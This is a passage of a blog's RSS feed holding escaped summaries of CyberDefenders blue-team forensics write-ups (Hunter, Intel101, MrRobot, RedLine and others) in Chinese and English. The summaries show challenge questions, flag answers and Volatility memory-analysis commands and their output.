Part 1: &lt;a href="https://hackmd.io/@SBK6401/By1BpZIf6">https://hackmd.io/@SBK6401/By1BpZIf6&lt;/a>
Part 3: &lt;a href="https://hackmd.io/@SBK6401/HylP8ixQp">https://hackmd.io/@SBK6401/HylP8ixQp&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://goldfynch.com/pst-viewer/index.html#0/33474/2098436">PST Viewer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://jsonformatter.org/xml-parser">xml parser&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sqlitebrowser.org/dl/">DB Browser for SQLlite&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="q11">
 ==Q11==
 &lt;a class="anchor" href="#q11">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>How many ports were scanned?&lt;/p>&lt;/blockquote>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;p>呈上題
&lt;img src="https://hackmd.io/_uploads/r1Gbf_vM6.png" alt="" />&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>1000&lt;/code>
:::&lt;/p>
&lt;h2 id="q12">
 ==Q12==
 &lt;a class="anchor" href="#q12">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What ports were found &amp;ldquo;open&amp;rdquo;?(comma-separated, ascending)&lt;/p>&lt;/blockquote>
&lt;h3 id="exploit-1">
 Exploit
 &lt;a class="anchor" href="#exploit-1">#&lt;/a>
&lt;/h3>
&lt;p>呈上題
&lt;img src="https://hackmd.io/_uploads/HJfozdDG6.png" alt="" />&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>22,80,9929,31337&lt;/code>
:::&lt;/p>
&lt;h2 id="q13">
 ==Q13==
 &lt;a class="anchor" href="#q13">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What was the version of the network scanner running on this computer?&lt;/p></description></item><item><title>CyberDefender - Hunter (Part 3)</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-3/</guid><description>&lt;h1 id="cyberdefender---hunter-part-3">
 CyberDefender - Hunter (Part 3)
 &lt;a class="anchor" href="#cyberdefender---hunter-part-3">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/32">https://cyberdefenders.org/blueteam-ctf-challenges/32&lt;/a>
Part 1: &lt;a href="https://hackmd.io/@SBK6401/By1BpZIf6">https://hackmd.io/@SBK6401/By1BpZIf6&lt;/a>
Part 2: &lt;a href="https://hackmd.io/@SBK6401/HJlmeuwfT">https://hackmd.io/@SBK6401/HJlmeuwfT&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://ericzimmerman.github.io/#!index.md">JLECmd&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="q21">
 ==Q21==
 &lt;a class="anchor" href="#q21">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>One of the installed applications is a file shredder. What is the name of the application? (two words space separated)&lt;/p>&lt;/blockquote>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>承接上一題，我們已經知道BCWipe就是題目要的答案，也就是類似file shredder的工具，但前面六個字還是沒有想法，看了一下外層資料夾才發現&lt;a href="https://www.jetico.com/">Jetico&lt;/a>是啥東西啊，上網查才發現是提供各種data encryption/data wiping/endpoint data protection之類的公司，所以這一題的正確答案是&lt;code>Jetico BCWipe&lt;/code>&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>Jetico BCWipe&lt;/code>
:::&lt;/p>
&lt;h2 id="q22">
 ==Q22==
 &lt;a class="anchor" href="#q22">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>How many prefetch files were discovered on the system?&lt;/p></description></item><item><title>CyberDefender - Intel101</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/threat-intel/cyberdefender---intel101/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/threat-intel/cyberdefender---intel101/</guid><description>&lt;h1 id="cyberdefender---intel101">
 CyberDefender - Intel101
 &lt;a class="anchor" href="#cyberdefender---intel101">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/38">https://cyberdefenders.org/blueteam-ctf-challenges/38&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Open-source intelligence (OSINT) exercise to practice mining and analyzing public data to produce meaningful intel when investigating external threats as a security blue team analyst.
Tools&lt;/p>&lt;/blockquote>
&lt;h2 id="tool">
 Tool
 &lt;a class="anchor" href="#tool">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lens.google/">Google Lens&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://web.archive.org/">archive.org&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.tecmint.com/whois-command-get-domain-and-ip-address-information/#:~:text=In%20Linux%2C%20the%20whois%20command,in%20a%20human%2Dreadable%20format.">WhoIS&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Who is the Registrar for jameskainth.com?&lt;/p>&lt;/blockquote>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>看&lt;a href="https://www.whois.com/whois/jameskainth.com">whois&lt;/a>的搜尋結果
&lt;img src="https://hackmd.io/_uploads/rJIevf8mp.png" alt="圖片.png" />&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>NameCheap&lt;/code>
:::&lt;/p>
&lt;h2 id="q2">
 ==Q2==
 &lt;a class="anchor" href="#q2">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>You get a phone call from this number: 855-707-7328, they were previously known by another name? (No spaces between words)&lt;/p></description></item><item><title>CyberDefender - KrakenKeylogger</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/cyberdefender---krakenkeylogger/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/cyberdefender---krakenkeylogger/</guid><description>&lt;h1 id="cyberdefender---krakenkeylogger">
 CyberDefender - KrakenKeylogger
 &lt;a class="anchor" href="#cyberdefender---krakenkeylogger">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.&lt;/p></description></item><item><title>CyberDefender - L'espion</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/threat-intel/cyberdefender---lespion/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/threat-intel/cyberdefender---lespion/</guid><description>&lt;h1 id="cyberdefender---lespion">
 CyberDefender - L&amp;rsquo;espion
 &lt;a class="anchor" href="#cyberdefender---lespion">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/73">https://cyberdefenders.org/blueteam-ctf-challenges/73&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>You, as a soc analyst, have been tasked by a client whose network was compromised and brought offline to investigate the incident and determine the attacker&amp;rsquo;s identity.&lt;/p>
&lt;p>Incident responders and digital forensic investigators are currently on the scene and have conducted a preliminary investigation. Their findings show that the attack originated from a single user account, probably, an insider.&lt;/p></description></item><item><title>CyberDefender - MrRobot - POS</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---pos/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---pos/</guid><description>&lt;h1 id="cyberdefender---mrrobot---pos">
 CyberDefender - MrRobot - POS
 &lt;a class="anchor" href="#cyberdefender---mrrobot---pos">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/88">https://cyberdefenders.org/blueteam-ctf-challenges/88&lt;/a>
Target 1: &lt;a href="https://hackmd.io/@SBK6401/SkJAThwla">https://hackmd.io/@SBK6401/SkJAThwla&lt;/a>
Target 2: &lt;a href="https://hackmd.io/@SBK6401/HJz2FPne6">https://hackmd.io/@SBK6401/HJz2FPne6&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="lab---pos">
 Lab - POS
 &lt;a class="anchor" href="#lab---pos">#&lt;/a>
&lt;/h2>
&lt;h3 id="起手式">
 起手式
 &lt;a class="anchor" href="#%e8%b5%b7%e6%89%8b%e5%bc%8f">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ volatility_2.6_win64_standalone.exe -f memory.dmp imageinfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility Foundation Volatility Framework 2.6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INFO : volatility.debug : Determining profile based on KDBG search...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 &lt;span style="color:#f92672">(&lt;/span>Instantiated with WinXPSP2x86&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer1 : IA32PagedMemoryPae &lt;span style="color:#f92672">(&lt;/span>Kernel AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer2 : WindowsCrashDumpSpace32 &lt;span style="color:#f92672">(&lt;/span>Unnamed AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer3 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>D:&lt;span style="color:#ae81ff">\N&lt;/span>TU&lt;span style="color:#ae81ff">\C&lt;/span>TF&lt;span style="color:#ae81ff">\C&lt;/span>yberDefenders&lt;span style="color:#ae81ff">\c&lt;/span>69-Grrcon2015&lt;span style="color:#ae81ff">\p&lt;/span>os01&lt;span style="color:#ae81ff">\m&lt;/span>emory.dmp&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PAE type : PAE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DTB : 0x3ecde260L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KUSER_SHARED_DATA : 0xffdf0000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image date and time : 2015-10-09 12:52:56 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image local date and time : 2015-10-09 08:52:56 -0400
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>重要資訊System Name:&lt;/p></description></item><item><title>CyberDefender - MrRobot - Target 2</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-2/</guid><description>&lt;h1 id="cyberdefender---mrrobot---target-2">
 CyberDefender - MrRobot - Target 2
 &lt;a class="anchor" href="#cyberdefender---mrrobot---target-2">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/88">https://cyberdefenders.org/blueteam-ctf-challenges/88&lt;/a>
Target 1: &lt;a href="https://hackmd.io/@SBK6401/SkJAThwla">https://hackmd.io/@SBK6401/SkJAThwla&lt;/a>
POS: &lt;a href="https://hackmd.io/@SBK6401/BJpJqDhlp">https://hackmd.io/@SBK6401/BJpJqDhlp&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::
Lecture Video: &lt;a href="https://youtu.be/4u5ckjfFRuM?si=MKeBkxyz5vcnsJfh"> 2022/06/29 藍隊安全系列課程 04 &lt;/a>
&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">Volatility - Cheat Sheet&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="lab---target-2">
 Lab - Target 2
 &lt;a class="anchor" href="#lab---target-2">#&lt;/a>
&lt;/h2>
&lt;h3 id="起手式">
 起手式
 &lt;a class="anchor" href="#%e8%b5%b7%e6%89%8b%e5%bc%8f">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ volatility_2.6_win64_standalone.exe -f memory.dmp imageinfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility Foundation Volatility Framework 2.6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INFO : volatility.debug : Determining profile based on KDBG search...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 &lt;span style="color:#f92672">(&lt;/span>Instantiated with WinXPSP2x86&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer1 : IA32PagedMemoryPae &lt;span style="color:#f92672">(&lt;/span>Kernel AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer2 : WindowsCrashDumpSpace32 &lt;span style="color:#f92672">(&lt;/span>Unnamed AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer3 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>D:&lt;span style="color:#ae81ff">\N&lt;/span>TU&lt;span style="color:#ae81ff">\C&lt;/span>TF&lt;span style="color:#ae81ff">\C&lt;/span>yberDefenders&lt;span style="color:#ae81ff">\c&lt;/span>69-Grrcon2015&lt;span style="color:#ae81ff">\t&lt;/span>arget2&lt;span style="color:#ae81ff">\m&lt;/span>emory.dmp&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PAE type : PAE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DTB : 0x3ed36260L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KUSER_SHARED_DATA : 0xffdf0000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image date and time : 2015-10-09 12:53:12 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image local date and time : 2015-10-09 08:53:12 -0400
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>重要資訊System Name: Win7SP0x86&lt;/p></description></item><item><title>CyberDefender - PoisonedCredentials</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/network-forensic/cyberdefender---poisonedcredentials/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/network-forensic/cyberdefender---poisonedcredentials/</guid><description>&lt;h1 id="cyberdefender---poisonedcredentials">
 CyberDefender - PoisonedCredentials
 &lt;a class="anchor" href="#cyberdefender---poisonedcredentials">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/146#nav-questions">https://cyberdefenders.org/blueteam-ctf-challenges/146#nav-questions&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Your organization&amp;rsquo;s security team has detected a surge in suspicious network activity. There are concerns that LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning attacks may be occurring within your network. These attacks are known for exploiting these protocols to intercept network traffic and potentially compromise user credentials. Your task is to investigate the network logs and examine captured network traffic.&lt;/p></description></item><item><title>CyberDefender - PsExec Hunt</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/network-forensic/cyberdefender---psexec-hunt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/network-forensic/cyberdefender---psexec-hunt/</guid><description>&lt;h1 id="cyberdefender---psexec-hunt">
 CyberDefender - PsExec Hunt
 &lt;a class="anchor" href="#cyberdefender---psexec-hunt">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Our Intrusion Detection System (IDS) has raised an alert, indicating suspicious lateral movement activity involving the use of PsExec. To effectively respond to this incident, your role as a SOC Analyst is to analyze the captured network traffic stored in a PCAP file.&lt;/p>&lt;/blockquote>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>In order to effectively trace the attacker&amp;rsquo;s activities within our network, can you determine the IP address of the machine where the attacker initially gained access?&lt;/p></description></item><item><title>CyberDefender - RedLine</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/cyberdefender---redline/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/cyberdefender---redline/</guid><description>&lt;h1 id="cyberdefender---redline">
 CyberDefender - RedLine
 &lt;a class="anchor" href="#cyberdefender---redline">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/106">https://cyberdefenders.org/blueteam-ctf-challenges/106&lt;/a>
:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>這一次的instance必須要使用volatility3才能解&lt;/p>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What is the name of the suspicious process?&lt;/p>&lt;/blockquote>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>直覺會想到直接pslist看有哪一些正在執行的process，不過&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>提供了不一樣的想法，既然他是可疑的process，那就代表有機會操作一些malware會有的pattern例如injection之類的，所以可以先從malfind下手，看一下有哪一個process正在執行類似的操作&lt;/p>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>方法一: 直接pslist
:::spoiler Command Result
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python vol.py -f MemoryDump.mem windows.pslist
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PID PPID ImageFileName Offset&lt;span style="color:#f92672">(&lt;/span>V&lt;span style="color:#f92672">)&lt;/span> Threads Handles SessionId Wow64 CreateTime ExitTime File output
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> System 0xad8185883180 &lt;span style="color:#ae81ff">157&lt;/span> - N/A False 2023-05-21 22:27:10.000000 N/A Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">108&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Registry 0xad81858f2080 &lt;span style="color:#ae81ff">4&lt;/span> - N/A False 2023-05-21 22:26:54.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">332&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> smss.exe 0xad81860dc040 &lt;span style="color:#ae81ff">2&lt;/span> - N/A False 2023-05-21 22:27:10.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">452&lt;/span> &lt;span style="color:#ae81ff">444&lt;/span> csrss.exe 0xad81861cd080 &lt;span style="color:#ae81ff">12&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:22.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">528&lt;/span> &lt;span style="color:#ae81ff">520&lt;/span> csrss.exe 0xad8186f1b140 &lt;span style="color:#ae81ff">14&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:27:25.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">552&lt;/span> &lt;span style="color:#ae81ff">444&lt;/span> wininit.exe 0xad8186f2b080 &lt;span style="color:#ae81ff">1&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:25.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">588&lt;/span> &lt;span style="color:#ae81ff">520&lt;/span> winlogon.exe 0xad8186f450c0 &lt;span style="color:#ae81ff">5&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:27:25.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">676&lt;/span> &lt;span style="color:#ae81ff">552&lt;/span> services.exe 0xad8186f4d080 &lt;span style="color:#ae81ff">7&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:29.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">696&lt;/span> &lt;span style="color:#ae81ff">552&lt;/span> lsass.exe 0xad8186fc6080 &lt;span style="color:#ae81ff">10&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:29.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">824&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818761d240 &lt;span style="color:#ae81ff">22&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:32.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">852&lt;/span> &lt;span style="color:#ae81ff">552&lt;/span> fontdrvhost.ex 0xad818761b0c0 &lt;span style="color:#ae81ff">5&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:33.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">860&lt;/span> &lt;span style="color:#ae81ff">588&lt;/span> fontdrvhost.ex 0xad818761f140 &lt;span style="color:#ae81ff">5&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:27:33.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">952&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad81876802c0 &lt;span style="color:#ae81ff">12&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:36.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1016&lt;/span> &lt;span style="color:#ae81ff">588&lt;/span> dwm.exe 0xad81876e4340 &lt;span style="color:#ae81ff">15&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:27:38.000000 N/A Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">448&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8187721240 &lt;span style="color:#ae81ff">54&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:41.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">752&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8187758280 &lt;span style="color:#ae81ff">21&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:43.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1012&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818774c080 &lt;span style="color:#ae81ff">19&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:43.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1196&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad81877972c0 &lt;span style="color:#ae81ff">34&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:46.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1280&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> MemCompression 0xad8187835080 &lt;span style="color:#ae81ff">62&lt;/span> - N/A False 2023-05-21 22:27:49.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1376&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad81878020c0 &lt;span style="color:#ae81ff">15&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:49.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1448&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818796c2c0 &lt;span style="color:#ae81ff">30&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:52.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1496&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad81879752c0 &lt;span style="color:#ae81ff">12&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:52.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1644&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8187a112c0 &lt;span style="color:#ae81ff">6&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:58.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1652&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8187a2d2c0 &lt;span style="color:#ae81ff">10&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:58.000000 N/Disabled
